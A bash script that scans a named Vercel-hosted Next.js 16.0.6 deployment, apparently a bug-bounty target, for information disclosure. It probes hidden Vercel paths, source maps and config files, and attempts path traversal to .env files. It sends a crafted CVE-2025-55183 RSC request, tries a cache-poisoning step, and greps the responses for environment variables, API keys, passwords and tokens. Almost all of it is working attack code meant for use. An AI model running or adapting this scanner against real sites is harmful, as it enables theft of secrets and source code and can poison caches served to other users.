#!/bin/bash

# Quick scan for Next.js 16.0.6 alternative attack vectors
# Focus on high-priority information disclosure vectors

TARGET="https://nextjs-cve-hackerone.vercel.app"
BUILD_ID="bIW_p-jXOXL69_fsJ2_vY"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}=========================================${NC}"
echo -e "${GREEN}Next.js 16.0.6 Quick Security Scan${NC}"
echo -e "${GREEN}=========================================${NC}"
echo ""

# Function to test URL
test_url() {
    local url=$1
    local description=$2

    echo -e "${YELLOW}[*] Testing: $description${NC}"
    echo "    URL: $url"

    STATUS=$(curl -s -o /tmp/response.txt -w "%{http_code}" "$url")
    SIZE=$(wc -c < /tmp/response.txt)

    echo "    Status: $STATUS"
    echo "    Size: $SIZE bytes"

    if [ "$STATUS" = "200" ] && [ "$SIZE" -gt 0 ]; then
        echo -e "${RED}    [!!!] ACCESSIBLE!${NC}"

        # Search for secrets
        if grep -qi "VERCEL_PLATFORM_PROTECTION\|VERCEL_.*=" /tmp/response.txt; then
            echo -e "${RED}    [!!!] FOUND ENVIRONMENT VARIABLES!${NC}"
            grep -i "VERCEL_" /tmp/response.txt | head -5
        fi

        if grep -qi "api[_-]key\|secret\|password\|token" /tmp/response.txt; then
            echo -e "${RED}    [!!!] FOUND POTENTIAL SECRETS!${NC}"
        fi

        echo "    Preview:"
        head -10 /tmp/response.txt | sed 's/^/      /'

        # Save response
        filename=$(echo "$url" | sed 's|https://||g' | sed 's|/|_|g')
        cp /tmp/response.txt "response_${filename}.txt"
        echo -e "${GREEN}    Saved to: response_${filename}.txt${NC}"
    elif [ "$STATUS" = "403" ]; then
        echo "    Protected (403 Forbidden)"
    elif [ "$STATUS" = "401" ]; then
        echo "    Requires Authentication (401)"
    else
        echo "    Not accessible"
    fi

    echo ""
}

# Function to test with custom headers
test_url_with_headers() {
    local url=$1
    local description=$2
    shift 2
    local headers=("$@")

    echo -e "${YELLOW}[*] Testing: $description${NC}"
    echo "    URL: $url"

    # Build curl command with headers
    curl_cmd="curl -s -o /tmp/response.txt -w %{http_code}"
    for header in "${headers[@]}"; do
        curl_cmd="$curl_cmd -H \"$header\""
    done
    curl_cmd="$curl_cmd \"$url\""

    STATUS=$(eval $curl_cmd)
    SIZE=$(wc -c < /tmp/response.txt)

    echo "    Status: $STATUS"
    echo "    Size: $SIZE bytes"

    if [ "$STATUS" = "200" ] && [ "$SIZE" -gt 0 ]; then
        echo -e "${RED}    [!!!] ACCESSIBLE!${NC}"
        echo "    Preview:"
        head -10 /tmp/response.txt | sed 's/^/      /'

        # Save response
        filename=$(echo "$description" | sed 's/ /_/g')
        cp /tmp/response.txt "response_${filename}.txt"
        echo -e "${GREEN}    Saved to: response_${filename}.txt${NC}"
    fi

    echo ""
}

echo -e "${YELLOW}=========================================${NC}"
echo -e "${YELLOW}CRITICAL: Vercel Special Paths${NC}"
echo -e "${YELLOW}=========================================${NC}"
echo ""

test_url "$TARGET/_src" "Vercel Source Code Access (_src)"
test_url "$TARGET/_logs" "Vercel Build Logs Access (_logs)"

echo -e "${YELLOW}=========================================${NC}"
echo -e "${YELLOW}HIGH: Source Maps${NC}"
echo -e "${YELLOW}=========================================${NC}"
echo ""

# Check if source maps are enabled
echo -e "${YELLOW}[*] Checking if source maps are enabled...${NC}"
curl -s "$TARGET/_next/static/chunks/main.js" > /tmp/main.js
if grep -q "sourceMappingURL" /tmp/main.js; then
    echo -e "${RED}    [!!!] Source maps are enabled!${NC}"
    SOURCE_MAP=$(grep -o "sourceMappingURL=[^ ]*" /tmp/main.js | cut -d= -f2)
    echo "    Source map URL: $SOURCE_MAP"
else
    echo "    Source maps not referenced in main.js"
fi
echo ""

test_url "$TARGET/_next/static/chunks/main.js.map" "Main JavaScript Source Map"
test_url "$TARGET/_next/static/chunks/webpack.js.map" "Webpack Source Map"
test_url "$TARGET/_next/static/chunks/framework.js.map" "Framework Source Map"

echo -e "${YELLOW}=========================================${NC}"
echo -e "${YELLOW}HIGH: API Routes (Environment Variables)${NC}"
echo -e "${YELLOW}=========================================${NC}"
echo ""

test_url "$TARGET/api/env" "API Route: /api/env"
test_url "$TARGET/api/config" "API Route: /api/config"
test_url "$TARGET/api/debug" "API Route: /api/debug"
test_url "$TARGET/api/health" "API Route: /api/health"
test_url "$TARGET/api/status" "API Route: /api/status"

echo -e "${YELLOW}=========================================${NC}"
echo -e "${YELLOW}HIGH: CVE-2025-55183 (Source Exposure)${NC}"
echo -e "${YELLOW}=========================================${NC}"
echo ""

test_url_with_headers "$TARGET" "CVE-2025-55183 RSC Source Exposure" \
    "Accept: text/x-component" \
    "Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D" \
    "RSC: 1"

echo -e "${YELLOW}=========================================${NC}"
echo -e "${YELLOW}MEDIUM: Build Artifacts${NC}"
echo -e "${YELLOW}=========================================${NC}"
echo ""

test_url "$TARGET/_next/static/$BUILD_ID/_buildManifest.js" "Build Manifest"
test_url "$TARGET/_next/static/$BUILD_ID/_middlewareManifest.js" "Middleware Manifest"
test_url "$TARGET/next.config.js" "Next.js Config"
test_url "$TARGET/package.json" "Package.json"
test_url "$TARGET/vercel.json" "Vercel Config"

echo -e "${YELLOW}=========================================${NC}"
echo -e "${YELLOW}MEDIUM: Path Traversal${NC}"
echo -e "${YELLOW}=========================================${NC}"
echo ""

test_url "$TARGET/_next/../../.env" "Path Traversal: .env"
test_url "$TARGET/_next/../../.env.local" "Path Traversal: .env.local"
test_url "$TARGET/_next/../../.env.production" "Path Traversal: .env.production"

echo -e "${YELLOW}=========================================${NC}"
echo -e "${YELLOW}MEDIUM: Cache Poisoning Test${NC}"
echo -e "${YELLOW}=========================================${NC}"
echo ""

echo -e "${YELLOW}[*] Step 1: Attempting to poison cache...${NC}"
curl -s -H "Accept: text/x-component" \
     -H "RSC: 1" \
     -H "Next-Router-Prefetch: 1" \
     "$TARGET" > /tmp/poison_attempt.txt
echo "    Sent poisoning request"
echo ""

sleep 1

echo -e "${YELLOW}[*] Step 2: Checking if cache was poisoned...${NC}"
curl -s "$TARGET" > /tmp/cache_check.txt

if head -1 /tmp/cache_check.txt | grep -q "^[01SM]:"; then
    echo -e "${RED}    [!!!] CACHE POISONED! Received RSC payload instead of HTML!${NC}"
    echo "    Preview:"
    head -10 /tmp/cache_check.txt | sed 's/^/      /'
    cp /tmp/cache_check.txt "response_cache_poisoned.txt"
    echo -e "${GREEN}    Saved to: response_cache_poisoned.txt${NC}"
else
    echo "    Cache not poisoned (normal HTML response)"
fi
echo ""

echo -e "${YELLOW}=========================================${NC}"
echo -e "${YELLOW}INFO: Response Headers${NC}"
echo -e "${YELLOW}=========================================${NC}"
echo ""

echo -e "${YELLOW}[*] Analyzing response headers...${NC}"
curl -I "$TARGET" 2>/dev/null | grep -i "x-vercel\|x-next\|server\|x-powered-by" | sed 's/^/    /'
echo ""

echo -e "${YELLOW}=========================================${NC}"
echo -e "${YELLOW}INFO: Discovery Files${NC}"
echo -e "${YELLOW}=========================================${NC}"
echo ""

test_url "$TARGET/robots.txt" "robots.txt"
test_url "$TARGET/sitemap.xml" "sitemap.xml"

echo -e "${GREEN}=========================================${NC}"
echo -e "${GREEN}Scan Complete!${NC}"
echo -e "${GREEN}=========================================${NC}"
echo ""

echo "Results saved to response_*.txt files"
echo ""

# Summary of findings
echo -e "${YELLOW}Summary:${NC}"
echo ""

if ls response_*.txt 1> /dev/null 2>&1; then
    echo -e "${GREEN}Files with accessible content:${NC}"
    ls -lh response_*.txt | awk '{print "  " $9 " (" $5 ")"}'
    echo ""

    echo -e "${YELLOW}Searching all responses for VERCEL environment variables...${NC}"
    if grep -h "VERCEL" response_*.txt 2>/dev/null; then
        echo -e "${RED}[!!!] FOUND VERCEL VARIABLES!${NC}"
    else
        echo "No VERCEL variables found in responses"
    fi
    echo ""

    echo -e "${YELLOW}Searching all responses for secrets...${NC}"
    if grep -hi "api[_-]key\|secret.*=\|password.*=\|token.*=" response_*.txt 2>/dev/null | head -5; then
        echo -e "${RED}[!!!] FOUND POTENTIAL SECRETS!${NC}"
    else
        echo "No obvious secrets found in responses"
    fi
else
    echo "No accessible endpoints found"
fi

echo ""
echo -e "${YELLOW}Next steps:${NC}"
echo "1. Review response_*.txt files for sensitive data"
echo "2. Run full Python script for detailed analysis: ./test_alternative_vectors.py"
echo "3. Check QUICK_TEST_URLS.md for manual testing"
echo "4. Review alternative_attack_vectors.md for all techniques"
